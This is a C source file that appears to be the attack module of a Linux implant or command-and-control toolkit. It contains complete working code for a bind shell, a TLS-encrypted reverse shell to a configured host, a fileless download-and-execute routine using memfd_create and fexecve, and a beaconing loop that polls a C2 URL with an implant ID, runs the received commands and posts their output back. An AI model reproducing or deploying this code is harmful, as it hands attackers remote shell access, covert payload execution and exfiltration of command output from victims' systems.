#if defined(DOWNLOAD_URL) || defined(TRIGGER)
#define _GNU_SOURCE
#include <sys/mman.h>
#endif

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <time.h>
#include <string.h>

#include <curl/curl.h>
#include "../include/attacks.h"
#include "../include/utils.h"

#define FULL_URL_SIZE 1024

#if defined(DOWNLOAD_URL) || defined(TRIGGER)
struct memory {
    char *response;
    size_t size;
};

static size_t call_back_func(char *data, size_t size, size_t nmemb, void *clientp) {
    size_t realsize = size * nmemb;
    struct memory *mem = (struct memory *) clientp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    mem->response = ptr;
    memcpy(mem->response + mem->size, data, realsize);
    
    mem->size += realsize;
    mem->response[mem->size] = '\0';
    return realsize;
}

static int get_command(CURL *curl, char *full_get_url, struct memory *command) {
    CURLcode res;

    curl_easy_setopt(curl, CURLOPT_URL, full_get_url);
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, call_back_func);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)command);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    res = curl_easy_perform(curl);
    if(res) {
        LOG("curl_easy_perform() error: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return -1;
    }

    return 0;
}
#endif

#ifdef TRIGGER
static int post_data(CURL *curl, char *command_output, int total_bytes, char *full_post_url) {
    CURLcode res;

    char *escaped_command = curl_easy_escape(curl, command_output, total_bytes);
    if (!escaped_command) {
        LOG("curl_easy_escape() failed in post_data()\n");
        return -1;
    }

    size_t final_size = strlen(escaped_command) + strlen("result=") + 1;
    char *final_output = (char*)malloc(final_size);
    if(!final_output) {
        LOG("malloc() failed in post_data()\n");
        curl_free(escaped_command);
        return -1;
    }
    
    snprintf(final_output, final_size, "result=%s", escaped_command);

    curl_easy_setopt(curl, CURLOPT_URL, full_post_url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, final_size);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, final_output);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    res = curl_easy_perform(curl);
    if(res) {
        LOG("curl_easy_perform() error in post_data(): %s\n", curl_easy_strerror(res));
        curl_free(escaped_command);
        return -1;
    }

    curl_free(escaped_command);

    return 0;
}

static char *extract_output(int fd, int *total_bytes) {
    int bytes_ret;
    int size = 64;

    char *command_output = (char *) malloc(size);
    if(!command_output) {
        LOG("malloc() failed in extract_output()\n");
        return NULL;
    }
    memset(command_output, 0, size);

    while((bytes_ret = read(fd, command_output + (*total_bytes), size - (*total_bytes))) > 0) {
        (*total_bytes) += bytes_ret;
        if((*total_bytes) == size) {
            int prev_size = size;
            size *= 2;
            command_output = realloc(command_output, size);
            memset(command_output + prev_size, 0, (size-prev_size));
        }
    }

    return command_output;
}

static char **parse_command(char *cmd) {
    int count = 0;
    char *copy = strdup(cmd);
    char *token = strtok(copy, " \t\n");
    while(token) {
        count++;
        token = strtok(NULL, " \t\n");
    }
    free(copy);

    char **argv = calloc(count + 1, sizeof(char *));
    copy = strdup(cmd);
    token = strtok(copy, " \t\n");
    for(int i = 0; i < count; i++) {
        argv[i] = strdup(token);
        token = strtok(NULL, " \t\n");
    }
    free(copy);
    argv[count] = NULL;
    return argv;
}
#endif

#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
static SSL_CTX *create_context(const SSL_METHOD *method) {
    SSL_CTX *ctx;

    ctx = SSL_CTX_new(method);

    if(!ctx) {
        LOG("SSL_CTX_new() failed\n");
        return NULL;
    }

    return ctx;
}

static void handle_shell(SSL *ssl) {

    int p;
    int serv_shell[2];
    int shell_serv[2];
    char buf[1024];

    if(pipe(serv_shell) == -1 || pipe(shell_serv) == -1) {
        LOG("pipe() failed\n");
        return;
    }

    switch (p = fork()) {
        case -1:
            LOG("fork() failed\n");
            exit(EXIT_FAILURE);
        case 0:
            dup2(serv_shell[0], STDIN_FILENO);
            dup2(shell_serv[1], STDOUT_FILENO);
            dup2(shell_serv[1], STDERR_FILENO);
            close(serv_shell[1]);
            close(shell_serv[0]);
            char* argv[] = {"/bin/sh", NULL};
            execve("/bin/sh", argv, NULL);
            LOG("execve failed\n");
            close(serv_shell[0]);
            close(shell_serv[1]);
            exit(EXIT_FAILURE);
        default:
            break;
    }

    close(serv_shell[0]);
    close(shell_serv[1]);

    int ssl_fd = SSL_get_fd(ssl);
    int shell_fd = shell_serv[0];
    fd_set readfds;
    int maxfd = (ssl_fd > shell_fd) ? ssl_fd : shell_fd;
    
    while (1) {
        FD_ZERO(&readfds);
        FD_SET(ssl_fd, &readfds);
        FD_SET(shell_fd, &readfds);
    
        int ready = select(maxfd + 1, &readfds, NULL, NULL, NULL);
        if (ready < 0) {
            LOG("select() failed\n");
            break;
        }
    
        // If SSL socket has data
        if (FD_ISSET(ssl_fd, &readfds)) {
            int bytes = SSL_read(ssl, buf, sizeof(buf));
            if (bytes <= 0) {
                int err = SSL_get_error(ssl, bytes);
                if (err == SSL_ERROR_ZERO_RETURN || err == SSL_ERROR_SYSCALL) {
                    break;
                }
            } else {
                write(serv_shell[1], buf, bytes);
            }
        }
    
        // If shell has output
        if (FD_ISSET(shell_fd, &readfds)) {
            int bytes = read(shell_fd, buf, sizeof(buf));
            if (bytes <= 0) {
                break;
            } else {
                SSL_write(ssl, buf, bytes);
            }
        }
    
        memset(buf, 0, sizeof(buf));
    }

    int status;
    waitpid(p, &status, 0);

    close(serv_shell[1]);
    close(shell_serv[0]);
}
#endif

void bind_shell(void) {
#if defined(BIND_SHELL) && defined(BIND_PORT)
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(BIND_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    listen(sockfd, 0);

    int connfd = accept(sockfd, NULL, NULL);

    for(int i = 0; i < 3; i++) {
        dup2(connfd, i);
    }

    execve("/bin/sh", NULL, NULL);
#endif
}

void rev_shell(void) {
#if defined(REVERSE_SHELL) && defined(REVERSE_IP) && defined(REVERSE_PORT) && defined(DELAY_TIME)
    SSL_CTX *ctx;

    char *rev_ip = REVERSE_IP;
    uint16_t rev_port = REVERSE_PORT;
    unsigned int seconds = DELAY_TIME;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(rev_port);
    inet_pton(AF_INET, rev_ip, &addr.sin_addr);

    if(seconds > 300) seconds = 300;
    LOG("Sleeping %u seconds then attempting to connect\n", seconds);
    sleep(seconds);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if ((connect(sockfd, (struct sockaddr*)&addr, sizeof(addr))) != 0) {
        LOG("Failed to connect\n");
        return;
    }

    LOG("Connection on %s:%u\n", rev_ip, rev_port);

    if (!(ctx = create_context(TLS_method()))) return;
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);

    if (SSL_connect(ssl) != 1) {
        LOG("SSL Handshake failed\n");
        return;
    }

    LOG("SSL connection established\n");

    handle_shell(ssl);

    LOG("Disconnecting SSL connection\n");

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sockfd);
    SSL_CTX_free(ctx);
#endif
}


void download_exec(void) {
#ifdef DOWNLOAD_URL
    struct memory chunk = {0};
    curl_global_init(CURL_GLOBAL_DEFAULT);
    char *download_url = DOWNLOAD_URL;

    CURL *curl = curl_easy_init();
    
    if(!curl) {
        LOG("curl_easy_init() failed\n");
        return;
    }
 
    get_command(curl, download_url, &chunk);

    int mfd = memfd_create("mfd", MFD_CLOEXEC);
    if(mfd == -1) {
        LOG("memfd_create() failed: %s\n", strerror(errno));
        free(chunk.response);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return;
    }

    write(mfd, chunk.response, chunk.size);

    free(chunk.response);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    char *argv[] = { "downloaded_binary", NULL };
    char *envp[] = { NULL };
    fexecve(mfd, argv, envp);
    LOG("fexecve failed in execute(): %s\n", strerror(errno));
    exit(EXIT_FAILURE);
#endif
}

void beacon(void) {
#ifdef TRIGGER
    int i;
    #ifdef DELAY_TIME
    unsigned int delay = DELAY_TIME;
    #endif

    curl_global_init(CURL_GLOBAL_DEFAULT);

    const char *url = TRIGGER;
    const pid_t pid = getpid();
    struct memory command = {0};

    char full_get_url[FULL_URL_SIZE];
    snprintf(full_get_url, sizeof(full_get_url), "%s/get?implantID=%d", url, pid);

    char full_post_url[FULL_URL_SIZE];
    snprintf(full_post_url, FULL_URL_SIZE, "%s/post?implantID=%d", url, pid);

    CURL *curl = curl_easy_init();

    if(!curl) {
        LOG("curl_easy_init() failed\n");
        return;
    }

    while(1) {
        #if !defined(DELAY_TIME) || defined(JITTER)
        srand(time(NULL));
        int MIN = 5;
        int MAX = 60;
        int delay = MIN + rand() % (MAX - MIN + 1);
        #endif

        sleep(delay);

        int parent_child[2];
        int child_parent[2];

        get_command(curl, full_get_url, &command);

        if(!command.response) {
            continue;
        }

        char **argv = parse_command(command.response);
        char *envp[] = { NULL };

        if(strcmp(argv[0], "exit") == 0) {
            break;
        }

        if(pipe(parent_child) == -1 || pipe(child_parent) == -1) {
            LOG("pipe() failed\n");
            return;
        }

        switch(i = fork()) {
            case -1:
                LOG("fork() failed in beacon()\n");
                return;
            case 0:
                dup2(parent_child[0], STDIN_FILENO);
                dup2(child_parent[1], STDOUT_FILENO);
                dup2(child_parent[1], STDERR_FILENO);
                close(parent_child[1]);
                close(child_parent[0]);
                execvpe(argv[0], argv, envp);
                LOG("execvpe() failed in beacon(): %s\n", strerror(errno));
                exit(EXIT_FAILURE);
            default:
                break;
        }

        int status;
        waitpid(i, &status, 0);

        close(child_parent[1]);
        close(parent_child[0]);

        int total_bytes = 0;
        char *command_output = extract_output(child_parent[0], &total_bytes);
        if(!command_output) {
            goto cleanup;
        }
        
        post_data(curl, command_output, total_bytes, full_post_url);

        cleanup:
        free(command_output);
        close(parent_child[1]);
        close(child_parent[0]);
        free(command.response);
        memset(&command, 0, sizeof(command));
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();
#endif
}

